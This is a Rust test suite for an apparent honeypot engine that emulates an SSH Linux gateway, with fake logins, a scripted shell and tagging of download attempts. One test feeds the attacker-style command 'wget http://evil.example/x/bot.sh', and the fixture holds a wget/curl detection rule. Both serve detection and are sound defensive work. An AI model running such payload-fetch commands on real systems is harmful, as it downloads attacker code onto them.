use std::sync::Arc;
use std::time::Duration;

use bytes::Bytes;
use hp_core::{Action, Event, Host, HostReply, Secret};
use hp_track::{Outcome, Session, Track, Value};

/// A track that scripts every command by hand: the engine's own fixture, so
/// these tests do not depend on the shipped example.
const SCRIPTED: &str = r##"
name: ssh-linux-gateway
vars:
  failed_logins: 0
  cwd: /home/admin
start: auth

states:
  auth:
    on:
      - match: { event: auth_attempt }
        when: "failed_logins < 3"
        do:
          - set: { failed_logins: "failed_logins + 1" }
          - delay: 800ms..1500ms
          - auth: false
      - match: { event: auth_attempt }
        do:
          - tag: auth_success
          - delay: 400ms
          - auth: true
          - send: "Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)\n\nLast login: Tue Oct 28 09:14:02 2025 from 10.20.0.14\n"
          - goto: shell
    fallback:
      close: true

  shell:
    on:
      - match: { command: "^whoami$" }
        do: [ { send: "admin\n" } ]
      - match: { command: "^uname -a$" }
        do: [ { send: "Linux plc-gw-03 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux\n" } ]
      - match: { command: "^cd (?P<dir>\\S+)$" }
        do: [ { set: { cwd: "${dir}" } } ]
      - match: { command: "^pwd$" }
        do: [ { send: "${cwd}\n" } ]
      - match: { command: "^(wget|curl) (?P<url>\\S+)" }
        do:
          - tag: payload_fetch
          - delay: 2s..4s
          - send: "Saving to: '${basename(url)}'\n100%[=====>] 48.2K  --.-KB/s  in 0.3s\n"
      - match: { command: "^(exit|logout)$" }
        do: [ { close: true } ]
    fallback:
      send: "-bash: ${argv0}: command not found\n"
"##;

fn session(seed: u64) -> Session {
    Session::new(
        Arc::new(Track::from_yaml(SCRIPTED).expect("fixture track is valid")),
        seed,
        None,
    )
}
fn login(user: &str) -> Event {
    Event::AuthAttempt {
        user: user.into(),
        secret: Secret::new("hunter2"),
    }
}
fn cmd(c: &str) -> Event {
    Event::Command(c.into())
}

fn sent(o: &Outcome) -> String {
    o.actions
        .iter()
        .filter_map(|a| match a {
            Action::Send(b) => Some(String::from_utf8_lossy(b).into_owned()),
            _ => None,
        })
        .collect()
}
fn auth(o: &Outcome) -> Option<bool> {
    o.actions.iter().find_map(|a| match a {
        Action::AuthResult(b) => Some(*b),
        _ => None,
    })
}
fn delay(o: &Outcome) -> Option<Duration> {
    o.actions.iter().find_map(|a| match a {
        Action::Delay(d) => Some(*d),
        _ => None,
    })
}

#[test]
fn fails_three_logins_then_succeeds() {
    let mut s = session(1);
    for i in 0..3 {
        let o = s.step(&login("root"));
        assert_eq!(auth(&o), Some(false), "attempt {i}");
        let d = delay(&o).unwrap();
        assert!((800..=1500).contains(&(d.as_millis() as u64)), "{d:?}");
        assert_eq!(s.state(), "auth");
    }
    let o = s.step(&login("root"));
    assert_eq!(auth(&o), Some(true));
    assert_eq!(o.tags, ["auth_success"]);
    assert_eq!(o.transitions, [("auth".to_string(), "shell".to_string())]);
    assert_eq!(s.state(), "shell");
    assert_eq!(s.vars()["failed_logins"], Value::Int(3));
    assert!(o.errors.is_empty());
}

#[test]
fn shell_answers_and_remembers() {
    let mut s = session(1);
    for _ in 0..4 {
        s.step(&login("a"));
    }
    assert_eq!(sent(&s.step(&cmd("whoami"))), "admin\n");
    assert_eq!(sent(&s.step(&cmd("pwd"))), "/home/admin\n");
    assert!(s.step(&cmd("cd /var/tmp")).actions.is_empty());
    assert_eq!(sent(&s.step(&cmd("pwd"))), "/var/tmp\n");
}

#[test]
fn fetch_is_tagged_and_faked() {
    let mut s = session(7);
    for _ in 0..4 {
        s.step(&login("a"));
    }
    let o = s.step(&cmd("wget http://evil.example/x/bot.sh"));
    assert_eq!(o.tags, ["payload_fetch"]);
    assert!(sent(&o).contains("Saving to: 'bot.sh'"));
    let ms = delay(&o).unwrap().as_millis();
    assert!((2000..=4000).contains(&ms));
}

#[test]
fn fallback_and_close() {
    let mut s = session(1);
    for _ in 0..4 {
        s.step(&login("a"));
    }
    assert_eq!(
        sent(&s.step(&cmd("frobnicate --now"))),
        "-bash: frobnicate: command not found\n"
    );
    assert_eq!(sent(&s.step(&cmd(""))), "-bash: : command not found\n");
    assert!(matches!(s.step(&cmd("exit")).actions[..], [Action::Close]));
}

#[test]
fn unexpected_input_hits_the_fallback_and_never_panics() {
    let mut s = session(1);
    // Input of a kind the state has no rule for: the fallback answers (here, closes).
    for ev in [
        Event::Raw(Bytes::from_static(b"\xff\xfe\x00")),
        Event::Request {
            op: "x".into(),
            args: serde_json_null(),
        },
    ] {
        let o = s.step(&ev);
        assert!(matches!(o.actions[..], [Action::Close]));
    }
}
fn serde_json_null() -> serde_json::Value {
    serde_json::Value::Null
}

#[test]
fn same_seed_same_delays() {
    let run = |seed| {
        let mut s = session(seed);
        (0..3)
            .map(|_| delay(&s.step(&login("r"))).unwrap())
            .collect::<Vec<_>>()
    };
    assert_eq!(run(42), run(42));
    assert_ne!(run(42), run(43));
}

#[test]
fn runtime_errors_are_reported_not_fatal() {
    let t = Track::from_yaml(
        "
name: t
vars: { n: 0 }
start: a
states:
  a:
    on:
      - match: { command: 'x' }
        when: n
        do: [ { send: 'never' } ]
      - match: { command: 'y' }
        do: [ { set: { n: '1 / n' } }, { send: 'after' } ]
    fallback: { send: 'fb' }
",
    )
    .unwrap();
    let mut s = Session::new(Arc::new(t), 0, None);
    let o = s.step(&cmd("x"));
    assert_eq!(sent(&o), "fb");
    assert_eq!(o.errors.len(), 1);
    let o = s.step(&cmd("y"));
    assert_eq!(sent(&o), "after");
    assert_eq!(o.errors.len(), 1);
    assert_eq!(s.vars()["n"], Value::Int(0));
}

#[test]
fn string_variables_are_capped() {
    let t = Track::from_yaml(
        "
name: t
vars: { s: 'x' }
start: a
states:
  a:
    on:
      - match: { command: 'grow' }
        do: [ { set: { s: 's + s' } } ]
    fallback: { send: '${len(s)}' }
",
    )
    .unwrap();
    let mut s = Session::new(Arc::new(t), 0, None);
    let mut errors = 0;
    for _ in 0..40 {
        errors += s.step(&cmd("grow")).errors.len();
    }
    assert!(errors > 0, "growth must eventually be refused");
    let len: usize = sent(&s.step(&cmd("len"))).parse().unwrap();
    assert!(len <= 64 * 1024, "len={len}");
}

#[test]
fn lifecycle_events_are_not_answered_by_the_fallback() {
    // The example's `auth` fallback closes the connection; that must not
    // fire just because a peer connected or left.
    let mut s = session(1);
    for ev in [Event::Connected, Event::Disconnected] {
        let o = s.step(&ev);
        assert!(o.actions.is_empty() && o.errors.is_empty(), "{ev:?}: {o:?}");
    }
    assert_eq!(s.state(), "auth");
}

#[test]
fn rules_can_still_react_to_lifecycle_events() {
    let t = Track::from_yaml(
        "
name: t
vars: { greeted: 0 }
start: a
states:
  a:
    on:
      - match: { event: connected }
        do: [ { send: 'hello' }, { set: { greeted: 1 } } ]
      - match: { event: disconnected }
        do: [ { tag: left } ]
    fallback: { send: 'fb' }
",
    )
    .unwrap();
    let mut s = Session::new(Arc::new(t), 0, None);
    assert_eq!(sent(&s.step(&Event::Connected)), "hello");
    assert_eq!(s.vars()["greeted"], Value::Int(1));
    assert_eq!(s.step(&Event::Disconnected).tags, ["left"]);
    assert_eq!(sent(&s.step(&cmd("x"))), "fb");
}

// ------------------------------------------------------------ host steps

/// A stand-in machine: records who logged in and where they `cd`, flags `wget`.
struct FakeHost {
    user: String,
    cwd: String,
}

impl FakeHost {
    fn boxed() -> Option<Box<dyn Host>> {
        Some(Box::new(FakeHost {
            user: "nobody".into(),
            cwd: "/".into(),
        }))
    }
    fn reply(&self, output: &str) -> HostReply {
        HostReply {
            output: output.to_string(),
            prompt: format!("{}@fake:{}$ ", self.user, self.cwd),
            ..HostReply::default()
        }
    }
}

impl Host for FakeHost {
    fn login(&mut self, user: &str) -> HostReply {
        self.user = user.to_string();
        self.cwd = "/home".into();
        self.reply("")
    }
    fn run(&mut self, line: &str) -> HostReply {
        let mut r = self.reply(&format!("ran:{line}\n"));
        if let Some(dir) = line.strip_prefix("cd ") {
            self.cwd = dir.to_string();
            r = self.reply("");
        }
        if line.starts_with("wget") {
            r.tags = vec!["payload_fetch".into()];
        }
        if line == "exit" {
            r.exit = true;
            r.output = "logout\n".into();
        }
        r
    }
    fn var(&self, name: &str) -> Option<String> {
        match name {
            "user" => Some(self.user.clone()),
            "cwd" => Some(self.cwd.clone()),
            "hostname" => Some("fake".into()),
            _ => None,
        }
    }
}

const WITH_HOST: &str = r##"
name: t
start: auth
states:
  auth:
    on:
      - match: { event: auth_attempt }
        do: [ { auth: true }, { login: '${user}' }, { goto: shell } ]
    fallback: { close: true }
  shell:
    on:
      - match: { command: '^whoami$' }
        do: [ { send: "${host_user} in ${host_cwd} on ${host_hostname}\n" } ]
      - match: { command: '^wget' }
        do: [ { tag: payload_fetch }, { shell: '${command}' } ]
    fallback: { shell: '${command}' }
"##;

fn with_host() -> Session {
    Session::new(
        Arc::new(Track::from_yaml(WITH_HOST).unwrap()),
        0,
        FakeHost::boxed(),
    )
}

fn prompts(o: &Outcome) -> Vec<String> {
    o.actions
        .iter()
        .filter_map(|a| match a {
            Action::Prompt(p) => Some(p.clone()),
            _ => None,
        })
        .collect()
}

#[test]
fn login_and_shell_steps_drive_the_host() {
    let mut s = with_host();
    let o = s.step(&login("admin"));
    assert_eq!(auth(&o), Some(true));
    assert_eq!(
        prompts(&o),
        ["admin@fake:/home$ "],
        "login hands back the first prompt"
    );
    let o = s.step(&cmd("ls -l"));
    assert_eq!(sent(&o), "ran:ls -l\n");
    assert_eq!(prompts(&o), ["admin@fake:/home$ "]);
    let o = s.step(&cmd("cd /tmp"));
    assert_eq!(sent(&o), "");
    assert_eq!(
        prompts(&o),
        ["admin@fake:/tmp$ "],
        "the host's prompt follows its state"
    );
    assert!(o.errors.is_empty());
}

#[test]
fn the_shell_exiting_closes_the_session_after_its_output() {
    let mut s = with_host();
    s.step(&login("admin"));
    let o = s.step(&cmd("exit"));
    let kinds: Vec<&str> = o
        .actions
        .iter()
        .map(|a| match a {
            Action::Send(_) => "send",
            Action::Prompt(_) => "prompt",
            Action::Close => "close",
            _ => "other",
        })
        .collect();
    assert_eq!(kinds, ["send", "prompt", "close"]);
    assert_eq!(sent(&o), "logout\n");
}

#[test]
fn host_facts_are_available_to_expressions_and_templates() {
    let mut s = with_host();
    s.step(&login("operator"));
    s.step(&cmd("cd /var"));
    assert_eq!(sent(&s.step(&cmd("whoami"))), "operator in /var on fake\n");
}

#[test]
fn host_tags_reach_the_outcome_once() {
    let mut s = with_host();
    s.step(&login("admin"));
    let o = s.step(&cmd("wget http://x/y"));
    assert_eq!(
        o.tags,
        ["payload_fetch"],
        "the rule's tag and the host's tag are the same alert"
    );
}

#[test]
fn without_a_host_the_steps_report_an_error_instead_of_panicking() {
    let mut s = Session::new(Arc::new(Track::from_yaml(WITH_HOST).unwrap()), 0, None);
    let o = s.step(&login("admin"));
    assert!(
        o.errors
            .iter()
            .any(|e| e.contains("login: no emulated host")),
        "{:?}",
        o.errors
    );
    assert_eq!(auth(&o), Some(true), "the rest of the rule still runs");
    let o = s.step(&cmd("ls"));
    assert!(
        o.errors
            .iter()
            .any(|e| e.contains("shell: no emulated host")),
        "{:?}",
        o.errors
    );
    // host variables simply do not resolve
    let o = s.step(&cmd("whoami"));
    assert!(sent(&o).is_empty() && !o.errors.is_empty());
}
